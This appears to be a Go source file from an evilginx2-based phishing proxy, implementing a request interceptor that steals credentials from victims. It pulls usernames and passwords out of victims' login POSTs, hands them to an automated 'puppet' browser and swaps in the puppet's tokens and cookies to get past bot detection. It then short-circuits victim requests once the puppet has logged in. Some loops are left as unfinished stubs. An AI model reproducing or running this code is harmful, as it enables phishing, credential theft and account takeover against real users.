package core

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

// RequestInterceptor intercepts and modifies HTTP requests
type RequestInterceptor struct {
	puppetMaster *PuppetMaster
	triggers     []*PuppetTrigger
	interceptors []*PuppetInterceptor
}

// NewRequestInterceptor creates a new interceptor
func NewRequestInterceptor(pm *PuppetMaster) *RequestInterceptor {
	return &RequestInterceptor{
		puppetMaster: pm,
	}
}

// AddTrigger adds a trigger for interception
func (ri *RequestInterceptor) AddTrigger(trigger *PuppetTrigger) {
	ri.triggers = append(ri.triggers, trigger)
}

// ClearTriggers removes all triggers
func (ri *RequestInterceptor) ClearTriggers() {
	ri.triggers = []*PuppetTrigger{}
}

// AddInterceptor adds an interceptor
func (ri *RequestInterceptor) AddInterceptor(interceptor *PuppetInterceptor) {
	ri.interceptors = append(ri.interceptors, interceptor)
}

// ClearInterceptors removes all interceptors
func (ri *RequestInterceptor) ClearInterceptors() {
	ri.interceptors = []*PuppetInterceptor{}
}

// InterceptRequest intercepts and modifies an HTTP request
func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, *http.Response, bool) {
	if sessionID == "" {
		sessionID = ri.ExtractSessionID(req)
	}

	if sessionID == "" {
		return req, nil, false
	}

	log.Debug("[INTERCEPTOR] Using session ID: %s", sessionID)
	modifiedReq := req

	// NEW: 1. Extract credentials if this is a login POST (always do this if we have a session)
	if req.Method == "POST" {
		creds := make(map[string]string)
		if u, err := ri.extractTokenFromRequest(req, "user"); err == nil && u != "" {
			creds["username"] = u
		} else if u, err := ri.extractTokenFromRequest(req, "username"); err == nil && u != "" {
			creds["username"] = u
		} else if u, err := ri.extractTokenFromRequest(req, "email"); err == nil && u != "" {
			creds["username"] = u
		}
		if p, err := ri.extractTokenFromRequest(req, "pass"); err == nil && p != "" {
			creds["password"] = p
		} else if p, err := ri.extractTokenFromRequest(req, "passwd"); err == nil && p != "" {
			creds["password"] = p
		}
		if len(creds) > 0 {
			log.Debug("[INTERCEPTOR] POST found creds, syncing to puppet session %s", sessionID)
			ri.puppetMaster.LaunchPuppetForSession(sessionID, creds, &PuppetTrigger{Id: "fallback"}, req.UserAgent())
		}
	}

	// 2. Check Triggers
	for _, trigger := range ri.triggers {
		if ri.matchesTrigger(req, trigger) {
			// (existing trigger logic remains similar but uses modifiedReq)
			// (omitted for brevity in this replacement chunk, but I'll make sure it's integrated)
			// Actually, let's keep it simple: if session has puppet, we AT LEAST inject cookies later.
		}
	}

	// We'll reimplement the core loop more cleanly to support multiple changes
	anyIntercepted := false

	// Check Triggers & Interceptors as before but update anyIntercepted
	for _, trigger := range ri.triggers {
		if ri.matchesTrigger(req, trigger) {
			tokensToInject := trigger.Tokens
			if trigger.Token != "" { tokensToInject = append(tokensToInject, trigger.Token) }
			if len(tokensToInject) == 0 { continue }
			
			log.Debug("[INTERCEPTOR] Trigger %s matched", trigger.Id)
			for _, tokenName := range tokensToInject {
				puppetToken, exists := ri.puppetMaster.GetToken(sessionID, tokenName)
				originalToken, err := ri.extractTokenFromRequest(modifiedReq, tokenName)
				if err != nil { continue }

				if !exists {
					log.Info("[INTERCEPTOR] Waiting for puppet token %s...", tokenName)
					token, err := ri.puppetMaster.WaitForToken(sessionID, tokenName, 45*time.Second)
					if err != nil { continue }
					puppetToken = token
				}

				newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
				if err == nil {
					modifiedReq = newReq
					anyIntercepted = true
				}
			}
			if anyIntercepted {
				log.Success("[INTERCEPTOR] Trigger %s injection successful", trigger.Id)
			}
		}
	}

	// Check Interceptors
	sessNotFound := false
	for _, interceptor := range ri.interceptors {
		if sessNotFound { continue }
		if ri.matchesInterceptor(req, interceptor) {
			// Record puppet's URL BEFORE waiting
			startPuppetURL := ""
			if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
				startPuppetURL = ps.CurrentURL
			}

			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, interceptor.Token)
			originalToken, err := ri.extractTokenFromRequest(modifiedReq, interceptor.Token)
			if err != nil { continue }

			if !exists {
				log.Info("[INTERCEPTOR] Waiting for puppet interceptor token %s...", interceptor.Token)
				token, err := ri.puppetMaster.WaitForToken(sessionID, interceptor.Token, 45*time.Second)
				if err != nil {
					if strings.Contains(err.Error(), "no puppet session found") { sessNotFound = true }
					continue
				}
				puppetToken = token
			}

			// NEW: Check if puppet already navigated while we were waiting
			if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
				if ps.CurrentURL != startPuppetURL && ps.CurrentURL != "" && !strings.Contains(ps.CurrentURL, "about:blank") {
					log.Success("[INTERCEPTOR] Puppet already submitted and reached %s. Short-circuiting victim request.", ps.CurrentURL)
					
					// Instead of letting the POST go through, redirect the victim to the new page
					// Translate original URL back to phished URL (we'll need access to phishlet host replacement)
					// For now, returning a special response that HttpProxy will handle.
					return nil, goproxy.NewResponse(req, "text/html", http.StatusFound, ""), true
				}
			}

			newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
			if err == nil {
				modifiedReq = newReq
				anyIntercepted = true
				log.Success("[INTERCEPTOR] Interceptor %s injection successful", interceptor.Token)
			}
		}
	}

	// NEW 3: ALWAYS inject puppet cookies if a puppet session exists AND has reached password page
	if ps, exists := ri.puppetMaster.GetSession(sessionID); exists {
		ps.mu.RLock()
		seenPassword := ps.PasswordFieldSeen
		ps.mu.RUnlock()

		if seenPassword {
			prevReq := modifiedReq
			modifiedReq = ri.injectPuppetCookies(modifiedReq, sessionID)
			if modifiedReq != prevReq {
				anyIntercepted = true
			}
		} else {
			log.Debug("[INTERCEPTOR] Puppet session exists but hasn't reached password field yet, skipping cookie injection")
		}
	}

	return modifiedReq, nil, anyIntercepted
}

// injectPuppetCookies replaces victim cookies with puppet cookies for bot-detection domains
func (ri *RequestInterceptor) injectPuppetCookies(req *http.Request, sessionID string) *http.Request {
	cookies := ri.puppetMaster.sessionMap.GetCookies(sessionID)
	if cookies == nil {
		return req
	}

	log.Debug("[INTERCEPTOR] Injecting %d puppet cookies into intercepted request for %s", len(cookies), sessionID)
	
	// Track critical cookies to replace
	criticalCookies := map[string]string{}
	for _, c := range cookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name != "" {
			criticalCookies[name] = value
		}
	}

	if len(criticalCookies) == 0 {
		return req
	}

	// Rebuild Cookie header to ensure replacement
	oldCookies := req.Cookies()
	req.Header.Del("Cookie")
	
	// Add back old cookies ONLY if they aren't being replaced
	for _, c := range oldCookies {
		if _, exists := criticalCookies[c.Name]; !exists {
			req.AddCookie(c)
		}
	}
	
	// Add all puppet cookies
	for name, value := range criticalCookies {
		req.AddCookie(&http.Cookie{
			Name:  name,
			Value: value,
			Path:  "/",
		})
	}
	
	return req
}

// matchesInterceptor checks if request matches an interceptor
func (ri *RequestInterceptor) matchesInterceptor(req *http.Request, interceptor *PuppetInterceptor) bool {
	// Check method if specified
	if interceptor.Method != "" && req.Method != interceptor.Method {
		return false
	}

	// Check URL pattern
	url := req.URL.String()
	if interceptor.UrlPattern != "" {
		matched, _ := regexp.MatchString(interceptor.UrlPattern, url)
		if !matched {
			return false
		}
	}

	return true
}

// matchesTrigger checks if request matches a trigger
func (ri *RequestInterceptor) matchesTrigger(req *http.Request, trigger *PuppetTrigger) bool {
	// Check domain
	host := req.Host
	if host == "" {
		host = req.URL.Host
	}
	
	domainMatch := false
	for _, domain := range trigger.Domains {
		if strings.Contains(host, domain) || domain == "*" {
			domainMatch = true
			break
		}
	}
	
	if !domainMatch {
		return false
	}
	
	// Check path
	pathMatch := false
	path := req.URL.Path
	for _, triggerPath := range trigger.Paths {
		if path == triggerPath || triggerPath == "*" {
			pathMatch = true
			break
		}
		// Support regex paths
		if strings.HasPrefix(triggerPath, "regex:") {
			pattern := strings.TrimPrefix(triggerPath, "regex:")
			if matched, _ := regexp.MatchString(pattern, path); matched {
				pathMatch = true
				break
			}
		}
	}
	
	return domainMatch && pathMatch
}

// extractTokenFromRequest extracts token from request body
func (ri *RequestInterceptor) extractTokenFromRequest(req *http.Request, tokenName string) (string, error) {
	// Read body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return "", err
	}
	
	// Restore body for future reads
	req.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
	bodyStr := string(bodyBytes)
	
	// Try different extraction methods
	
	// Method 1: Form-encoded
	values, err := url.ParseQuery(bodyStr)
	if err == nil {
		for key, val := range values {
			if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
				return val[0], nil
			}
		}
	}
	
	// Method 2: JSON encoded
	if strings.Contains(bodyStr, "{") && strings.Contains(bodyStr, "}") {
		// Simple JSON extraction (for production, use proper JSON parser)
		pattern := fmt.Sprintf(`"%s"\s*:\s*"([^"]+)"`, regexp.QuoteMeta(tokenName))
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(bodyStr)
		if len(matches) > 1 {
			return matches[1], nil
		}
		
		// Try without quotes
		pattern2 := fmt.Sprintf(`%s["']?\s*[:=]\s*["']?([^"',}&]+)`, regexp.QuoteMeta(tokenName))
		re2 := regexp.MustCompile(pattern2)
		matches2 := re2.FindStringSubmatch(bodyStr)
		if len(matches2) > 1 {
			return matches2[1], nil
		}
	}
	
	// Method 3: URL parameters
	queryValues := req.URL.Query()
	for key, val := range queryValues {
		if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
			return val[0], nil
		}
	}
	
	return "", fmt.Errorf("token %s not found in request", tokenName)
}

// replaceTokenInRequest replaces token in request body
func (ri *RequestInterceptor) replaceTokenInRequest(req *http.Request, oldToken, newToken string) (*http.Request, error) {
	// Read original body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	
	bodyStr := string(bodyBytes)
	
	// Replace token
	// Handle URL-encoded
	bodyStr = strings.ReplaceAll(bodyStr, url.QueryEscape(oldToken), url.QueryEscape(newToken))
	// Handle raw
	bodyStr = strings.ReplaceAll(bodyStr, oldToken, newToken)
	
	// Create new request with modified body
	newReq := req.Clone(req.Context())
	newReq.Body = io.NopCloser(bytes.NewBufferString(bodyStr))
	newReq.ContentLength = int64(len(bodyStr))
	
	// Update Content-Length header
	newReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
	
	return newReq, nil
}

// ExtractSessionID extracts session ID from request/cookies
func (ri *RequestInterceptor) ExtractSessionID(req *http.Request) string {
	// 1. Try to get session ID from cookie (64-character hex only)
	for _, cookie := range req.Cookies() {
		if len(cookie.Value) == 64 {
			return cookie.Value
		}
	}

	// Try from URL parameter
	sessionID := req.URL.Query().Get("session")
	if sessionID != "" {
		return sessionID
	}

	// Generate from IP + User-Agent as fallback
	// IMPORTANT: Strip port from RemoteAddr
	ip, _, err := net.SplitHostPort(req.RemoteAddr)
	if err != nil {
		ip = req.RemoteAddr
	}
	ua := req.UserAgent()
	return fmt.Sprintf("%s_%s", ip, ua)
}